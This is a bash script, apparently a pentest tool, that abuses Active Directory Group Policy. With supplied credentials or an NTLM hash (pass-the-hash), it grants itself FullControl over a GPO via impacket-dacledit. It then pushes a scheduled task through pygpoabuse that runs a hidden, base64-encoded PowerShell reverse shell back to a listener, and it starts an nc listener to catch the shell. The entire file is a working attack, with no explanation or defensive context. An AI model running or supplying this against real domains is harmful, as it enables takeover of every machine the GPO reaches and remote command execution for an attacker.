#!/bin/bash

domain="$1"
user="$2"
password="$3"
gpo_guid="$4"
target_ip="$5"
listener_ip="$6"
listener_port="$7"

domain_prefix="$(echo $domain | cut -d'.' -f1)"
domain_suffix="$(echo $domain | cut -d'.' -f2)"
gpo_ldap_query="CN={$gpo_guid},CN=Policies,CN=System,DC=$domain_prefix,DC=$domain_suffix"

payload=$(python3 -c "import base64; print(base64.b64encode((r\"\"\"\$client = New-Object System.Net.Sockets.TCPClient(\"$listener_ip\",$listener_port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"\"\").encode(\"utf-16-le\")).decode())")

if [ -d "backupgpo" ]
then
  rm -rf backupgpo
fi

if [ -n "$(echo $password | grep -Eo '[0-9a-fA-F]{32}')" ]
then
  # Pass the Hash
  impacket-dacledit -principal $user -target-dn="$gpo_ldap_query" -dc-ip $target_ip -hashes :$password $domain/$user -action write -rights FullControl

  gpowned -u $user -hashes :$password -d $domain -dc-ip $target_ip -gpcmachine -backup backupgpo -name "{$gpo_guid}"

  pygpoabuse -hashes :$password $domain/$user -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
else
  impacket-dacledit -principal $user -target-dn="$gpo_ldap_query" -dc-ip $target_ip $domain/$user:$password -action write -rights FullControl

  gpowned -u $user -p $password -d $domain -dc-ip $target_ip -gpcmachine -backup backupgpo -name "{$gpo_guid}"

  pygpoabuse $domain/$user:$password -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
fi

echo -e "\nBe patient: this reverse shell could take as long as 30 minutes to come back"
rlwrap nc -lvnp $listener_port
